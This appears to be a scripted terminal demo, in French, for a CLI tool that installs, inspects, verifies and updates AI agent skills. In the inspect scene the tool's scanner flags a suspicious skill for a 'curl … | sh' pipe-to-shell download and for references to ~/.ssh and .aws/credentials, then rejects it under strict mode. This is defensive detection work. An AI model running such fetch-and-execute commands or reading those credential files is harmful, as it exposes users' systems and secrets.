@@ -1,0 +1,360 @@
+{
+ "lang": "fr",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 7 de plus</span>",
+      "<span class=\"d\">  19 sur 19 cochées</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 7 de plus</span>",
+      "<span class=\"d\">  0 sur 19 cochées</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"d\">Filtre :</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  5 sur 19 correspondent · 0 cochées</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"d\">Filtre :</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 sur 19 correspondent · 0 cochées</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"d\">Filtre :</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 sur 19 correspondent · 0 cochées</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span>",
+      "↑↓ déplacer · espace cocher · → toutes · ← aucune · tapez pour filtrer · e…",
+      "<span class=\"d\">Filtre :</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 sur 19 correspondent · 1 cochées</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span> pdf",
+      "<span class=\"b\">Dans quels agents ?</span>",
+      "↑↓ déplacer · espace cocher · → tous · ← aucun · tapez pour filtrer · entr…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  2 agents installés sur 74 · les autres, avec --agent &lt;id&gt; (liste dans sk…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span> pdf",
+      "<span class=\"b\">Dans quels agents ?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 fichiers · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: fichier exécutable ; acceptez-le avec",
+      "    allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Destinations :",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 bloquants · <span class=\"y\">1 avertissement</span>",
+      "Installer ? [o/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Quelles skills installer ?</span> pdf",
+      "<span class=\"b\">Dans quels agents ?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 fichiers · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: fichier exécutable ; acceptez-le avec",
+      "    allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Destinations :",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 bloquants · <span class=\"y\">1 avertissement</span>",
+      "Installer ? [o/N] o",
+      "",
+      "pdf (32cdced3a21a) installée dans 2 destinations."
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 fichiers · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: mentionne des identifiants : ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: fichier exécutable ; acceptez-le avec allow: [scripts]",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: télécharge et exécute du code : curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: mentionne des identifiants : .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 skill · 0 bloquants · <span class=\"y\">4 avertissements</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 fichiers · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: mentionne des identifiants : ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: fichier exécutable ; acceptez-le avec allow: [scripts]",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: télécharge et exécute du code : curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: mentionne des identifiants : .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "Destinations :",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 bloquants · <span class=\"y\">4 avertissements</span>",
+      "skilus: quick-cleanup : 4 avertissements avec --strict: rejeté par l’inspection"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "MODIFIÉE pdf (project, claude-code) dans ~/acme-app/.claude/skills/pdf",
+      "  modifié: SKILL.md",
+      "Lancez skilus sync pour les restaurer (avec --force si vous les avez modifiées à la main)."
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "pdf remplacée dans ~/acme-app/.claude/skills/pdf",
+      "Synchronisé : 0 installée(s), 1 remplacée(s), 5 inchangée(s)."
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "Tout est en ordre : 3 skill(s) dans 6 destination(s) correspondent au lock."
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "SKILL      PORTÉE   REF                   INSTALLÉ      DERNIER       ÉTAT",
+      "changelog  project  (branche par défaut)  9563a12b25b5  1b288cd0c1c1  nouvelle version disponible",
+      "pdf        project  (branche par défaut)  dbd4588f9e10  dbd4588f9e10  à jour",
+      "review     project  (branche par défaut)  9563a12b25b5  1b288cd0c1c1  nouvelle version disponible"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> aucun constat",
+      "",
+      "1 skill · 0 bloquants · 0 avertissements",
+      "Mettre à jour ? [o/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> aucun constat",
+      "",
+      "1 skill · 0 bloquants · 0 avertissements",
+      "Mettre à jour ? [o/N] o",
+      "",
+      "review mise à jour vers 1b288cd0c1c1 (1c92660a3b6f)."
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
